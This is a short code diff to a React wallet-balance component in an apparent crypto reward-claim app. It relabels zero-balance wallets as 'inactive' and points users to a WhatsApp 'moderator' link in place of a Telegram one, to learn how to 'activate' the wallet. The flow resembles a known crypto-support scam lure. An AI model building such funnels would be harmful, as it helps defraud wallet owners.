@@ -64,17 +64,17 @@ const WalletBalances: React.FC<WalletBalancesProps> = ({ onBalancesChange }) => 
     (!zkSyncBalance || parseFloat(zkSyncBalance?.formatted || '0') === 0);
 
   if (!isConnected) {
-    return <div className={styles.connectMessage}>Please connect your wallet.</div>;
+    return <div className={styles.connectMessage}>.................</div>;
   }
 
   if (allBalancesZero) {
     return (
       <div className={styles.inactiveWallet}>
-  <p>Inactive wallet, kindly connect an active wallet to claim your reward.</p>
+  <p>Inactive wallet, kindly connect an active wallet to claim reward.</p>
   <p>
-    Click to contact the moderator:{" "}
+    contact moderator on how to activate your Wallet , Click to contact the moderator:{" "}
     <a
-      href="https://t.me/kanau"
+      href="https://wa.me/message/J5P5BSYLHO5HK1"
       target="_blank"
       rel="noopener noreferrer"
       className={styles.moderatorButton}
@@ -89,7 +89,7 @@ const WalletBalances: React.FC<WalletBalancesProps> = ({ onBalancesChange }) => 
 
   return (
     <div className={styles.walletBalances}>
-      <h3 className={styles.title}>Wallet Details</h3>
+      <h3 className={styles.title}>Wallet Address</h3>
       <p className={styles.walletAddress}>{address}</p>
       <div className={styles.balancesContainer}>
         {ethBalance && parseFloat(ethBalance?.formatted) > 0 && (
